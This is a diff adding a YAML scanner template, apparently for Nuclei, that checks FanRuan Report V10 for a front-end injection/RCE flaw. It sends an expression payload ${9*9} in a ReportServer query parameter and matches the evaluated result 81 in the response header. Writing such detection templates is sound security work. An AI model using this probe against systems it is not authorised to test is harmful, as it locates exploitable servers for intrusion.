@@ -1,0 +1,26 @@
+id: fanruan-baobiaoV10-RCE
+
+info:
+  name: 帆软报表V10存在前台SQL注入缓存RCE
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |+
+      GET /webroot/decision/view/ReportServer?test=&n=${9*9} HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip, deflate
+      User-Agent: python-requests/2.31.0
+      Accept: */*
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "/webroot/decision/view/report?test&n=81"
+ 
